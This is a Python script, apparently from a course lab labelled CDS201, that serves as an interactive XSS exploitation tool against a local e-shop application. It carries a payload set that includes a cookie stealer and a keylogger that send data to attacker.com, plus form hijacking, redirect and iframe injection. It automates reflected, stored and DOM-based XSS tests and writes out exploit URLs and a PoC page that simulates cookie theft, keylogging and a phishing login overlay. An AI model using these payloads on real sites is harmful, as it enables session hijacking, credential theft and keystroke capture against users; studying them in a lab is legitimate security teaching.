#!/usr/bin/env python3
"""
XSS Exploitation Script for E-Shop Application
Educational Purpose Only - Part of CDS201 Course

This script demonstrates XSS vulnerabilities in various parts of the application.
"""

import requests
import sys
import urllib.parse
from colorama import init, Fore, Style
import json

# Initialize colorama for colored output
init(autoreset=True)

BASE_URL = "http://localhost:8000"


class XSSExploit:
    def __init__(self, base_url=BASE_URL):
        self.base_url = base_url
        self.session = requests.Session()
        self.payloads = self.load_payloads()
        
    def load_payloads(self):
        """Load XSS payloads for testing"""
        return {
            "basic_alert": "<script>alert('XSS')</script>",
            "img_onerror": "<img src=x onerror=alert('XSS')>",
            "svg_onload": "<svg onload=alert('XSS')>",
            "javascript_url": "javascript:alert('XSS')",
            "event_handler": "<div onmouseover='alert(\"XSS\")'>Hover me</div>",
            "encoded_script": "<script>alert(String.fromCharCode(88,83,83))</script>",
            "cookie_stealer": "<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>",
            "keylogger": "<script>document.onkeypress=function(e){fetch('http://attacker.com/log?k='+e.key)}</script>",
            "dom_manipulation": "<script>document.querySelectorAll('.price').forEach(e=>e.textContent='$0.01')</script>",
            "form_hijack": "<script>document.forms[0].action='http://attacker.com/phish'</script>",
            "iframe_injection": "<iframe src='http://attacker.com/malicious'></iframe>",
            "stored_redirect": "<script>window.location='http://attacker.com'</script>"
        }
    
    def test_reflected_xss(self):
        """Test for reflected XSS in search functionality"""
        print(f"{Fore.YELLOW}[*] Testing reflected XSS vulnerabilities...")
        
        vulnerable = False
        for name, payload in self.payloads.items():
            encoded_payload = urllib.parse.quote(payload)
            url = f"{self.base_url}/catalog/?q={encoded_payload}"
            
            try:
                response = self.session.get(url)
                
                # Check if payload is reflected without encoding
                if payload in response.text or payload.replace('"', '&quot;') in response.text:
                    print(f"{Fore.GREEN}[+] Reflected XSS found with payload: {name}")
                    print(f"{Fore.CYAN}    Payload: {payload[:50]}...")
                    vulnerable = True
                else:
                    print(f"{Fore.RED}[-] Payload {name} was filtered or encoded")
                    
            except Exception as e:
                print(f"{Fore.RED}[-] Error testing {name}: {e}")
        
        return vulnerable
    
    def test_stored_xss_review(self, username="testuser", password="testpass123"):
        """Test for stored XSS in product reviews"""
        print(f"{Fore.YELLOW}[*] Testing stored XSS in product reviews...")
        
        # First, try to login
        login_data = {
            'username': username,
            'password': password
        }
        
        login_response = self.session.post(f"{self.base_url}/login/", data=login_data)
        
        if "Invalid" in login_response.text or "does not exist" in login_response.text:
            print(f"{Fore.RED}[-] Login failed. Cannot test stored XSS without valid credentials.")
            print(f"{Fore.YELLOW}[!] Try creating a test account first.")
            return False
        
        print(f"{Fore.GREEN}[+] Logged in successfully")
        
        # Test stored XSS payloads in reviews
        product_id = 1  # Assuming product with ID 1 exists
        
        for name, payload in list(self.payloads.items())[:5]:  # Test first 5 payloads
            review_data = {
                'title': f'Test Review {name}',
                'content': payload,
                'rating': 5
            }
            
            try:
                # Submit review
                response = self.session.post(
                    f"{self.base_url}/product/{product_id}/review/",
                    data=review_data
                )
                
                if response.status_code == 200 or response.status_code == 302:
                    print(f"{Fore.GREEN}[+] Successfully submitted review with {name} payload")
                    
                    # Check if payload persists
                    product_page = self.session.get(f"{self.base_url}/product/{product_id}/")
                    if payload in product_page.text:
                        print(f"{Fore.GREEN}[+] Stored XSS confirmed! Payload persists on page.")
                        return True
                        
            except Exception as e:
                print(f"{Fore.RED}[-] Error submitting review: {e}")
        
        return False
    
    def generate_exploit_urls(self):
        """Generate various XSS exploit URLs for manual testing"""
        print(f"{Fore.YELLOW}[*] Generating XSS exploit URLs...")
        print(f"{Fore.CYAN}{'='*60}")
        
        for name, payload in self.payloads.items():
            encoded_payload = urllib.parse.quote(payload)
            url = f"{self.base_url}/catalog/?q={encoded_payload}"
            print(f"{Fore.GREEN}[{name}]")
            print(f"{Fore.CYAN}URL: {url}")
            print(f"{Fore.YELLOW}Payload: {payload}")
            print("-" * 60)
    
    def test_dom_xss(self):
        """Test for DOM-based XSS vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing DOM-based XSS...")
        
        # Test URLs that might have DOM XSS
        dom_payloads = [
            "#<img src=x onerror=alert('DOM-XSS')>",
            "#javascript:alert('DOM-XSS')",
            "?redirect=javascript:alert('DOM-XSS')",
            "?next=javascript:alert('DOM-XSS')"
        ]
        
        for payload in dom_payloads:
            url = f"{self.base_url}/catalog/{payload}"
            print(f"{Fore.CYAN}[*] Testing: {url}")
            
            try:
                response = self.session.get(url)
                # DOM XSS detection would require JavaScript execution
                # This is just to check if the payload reaches the page
                if "javascript:" in response.text or "onerror=" in response.text:
                    print(f"{Fore.YELLOW}[!] Potential DOM XSS vector found")
                    
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {e}")
    
    def create_xss_poc_page(self):
        """Create a proof-of-concept HTML page for XSS demonstration"""
        print(f"{Fore.YELLOW}[*] Creating XSS PoC HTML page...")
        
        poc_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>XSS Proof of Concept - E-Shop</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .exploit {{ margin: 20px 0; padding: 10px; border: 1px solid #ccc; }}
        .payload {{ background: #f0f0f0; padding: 5px; font-family: monospace; }}
        button {{ margin: 5px; padding: 10px; cursor: pointer; }}
    </style>
</head>
<body>
    <h1>XSS Exploitation PoC - E-Shop Application</h1>
    <p>Educational Purpose Only - CDS201 Course</p>
    
    <div class="exploit">
        <h2>1. Reflected XSS - Search</h2>
        <p>Click to execute reflected XSS in search:</p>
        <button onclick="window.open('{self.base_url}/catalog/?q=' + encodeURIComponent('<script>alert(\\'Reflected XSS\\')</script>'))">
            Basic Alert
        </button>
        <button onclick="window.open('{self.base_url}/catalog/?q=' + encodeURIComponent('<img src=x onerror=alert(\\'XSS\\')>'))">
            Image Error
        </button>
        <div class="payload">Payload: &lt;script&gt;alert('XSS')&lt;/script&gt;</div>
    </div>
    
    <div class="exploit">
        <h2>2. Cookie Stealer</h2>
        <p>Steal session cookies (simulated):</p>
        <button onclick="simulateCookieSteal()">Steal Cookies</button>
        <div class="payload">Payload: &lt;script&gt;new Image().src='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;</div>
    </div>
    
    <div class="exploit">
        <h2>3. Keylogger</h2>
        <p>Install keylogger (simulated):</p>
        <button onclick="simulateKeylogger()">Install Keylogger</button>
        <div class="payload">Payload: &lt;script&gt;document.onkeypress=function(e){{fetch('http://attacker.com/log?k='+e.key)}}&lt;/script&gt;</div>
    </div>
    
    <div class="exploit">
        <h2>4. Phishing Form</h2>
        <p>Inject fake login form:</p>
        <button onclick="injectPhishingForm()">Inject Form</button>
    </div>
    
    <script>
        function simulateCookieSteal() {{
            alert('Cookies stolen: ' + document.cookie);
            console.log('Stolen cookies:', document.cookie);
        }}
        
        function simulateKeylogger() {{
            alert('Keylogger installed! (simulated)');
            document.onkeypress = function(e) {{
                console.log('Key pressed:', e.key);
            }};
        }}
        
        function injectPhishingForm() {{
            const form = `
                <div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;border:2px solid red;z-index:9999;">
                    <h2>Session Expired - Please Login</h2>
                    <form onsubmit="alert('Credentials stolen! User: ' + this.username.value + ', Pass: ' + this.password.value); return false;">
                        <input name="username" placeholder="Username" required><br><br>
                        <input name="password" type="password" placeholder="Password" required><br><br>
                        <button type="submit">Login</button>
                        <button type="button" onclick="this.parentElement.parentElement.remove()">Close</button>
                    </form>
                </div>
            `;
            document.body.insertAdjacentHTML('beforeend', form);
        }}
    </script>
</body>
</html>"""
        
        filename = "xss_poc.html"
        with open(filename, 'w') as f:
            f.write(poc_html)
        
        print(f"{Fore.GREEN}[+] PoC page created: {filename}")
        print(f"{Fore.YELLOW}[!] Open {filename} in a browser to test XSS exploits")
    
    def automated_scan(self):
        """Run automated XSS vulnerability scan"""
        print(f"{Fore.CYAN}{Style.BRIGHT}=== XSS Automated Vulnerability Scan ==={Style.RESET_ALL}")
        print(f"{Fore.CYAN}Target: {self.base_url}")
        print(f"{Fore.CYAN}{'='*40}")
        
        # Test reflected XSS
        print(f"\n{Fore.YELLOW}[1] Reflected XSS Test")
        reflected_vuln = self.test_reflected_xss()
        
        # Test DOM XSS
        print(f"\n{Fore.YELLOW}[2] DOM-based XSS Test")
        self.test_dom_xss()
        
        # Generate exploit URLs
        print(f"\n{Fore.YELLOW}[3] Exploit URLs")
        self.generate_exploit_urls()
        
        # Create PoC page
        print(f"\n{Fore.YELLOW}[4] Creating PoC Page")
        self.create_xss_poc_page()
        
        print(f"\n{Fore.GREEN}{Style.BRIGHT}[+] XSS scan completed!")
        
        if reflected_vuln:
            print(f"{Fore.RED}[!] CRITICAL: Application is vulnerable to XSS attacks!")
            print(f"{Fore.YELLOW}[!] Recommendation: Enable output encoding and implement CSP")


def main():
    """Main function to run XSS exploits"""
    
    print(f"{Fore.CYAN}{Style.BRIGHT}")
    print("=" * 50)
    print("XSS Exploitation Tool - E-Shop Application")
    print("Educational Purpose Only - CDS201 Course")
    print("=" * 50)
    print(f"{Style.RESET_ALL}")
    
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = BASE_URL
    
    exploit = XSSExploit(base_url)
    
    while True:
        print(f"\n{Fore.CYAN}Select an option:")
        print("1. Run automated scan")
        print("2. Test reflected XSS")
        print("3. Test stored XSS (requires login)")
        print("4. Test DOM-based XSS")
        print("5. Generate exploit URLs")
        print("6. Create PoC HTML page")
        print("0. Exit")
        
        try:
            choice = input(f"{Fore.YELLOW}Enter choice: {Style.RESET_ALL}")
            
            if choice == "1":
                exploit.automated_scan()
            elif choice == "2":
                exploit.test_reflected_xss()
            elif choice == "3":
                username = input("Enter username: ")
                password = input("Enter password: ")
                exploit.test_stored_xss_review(username, password)
            elif choice == "4":
                exploit.test_dom_xss()
            elif choice == "5":
                exploit.generate_exploit_urls()
            elif choice == "6":
                exploit.create_xss_poc_page()
            elif choice == "0":
                print(f"{Fore.GREEN}[+] Exiting...")
                break
            else:
                print(f"{Fore.RED}[-] Invalid choice!")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Interrupted by user")
            break
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {e}")


if __name__ == "__main__":
    main()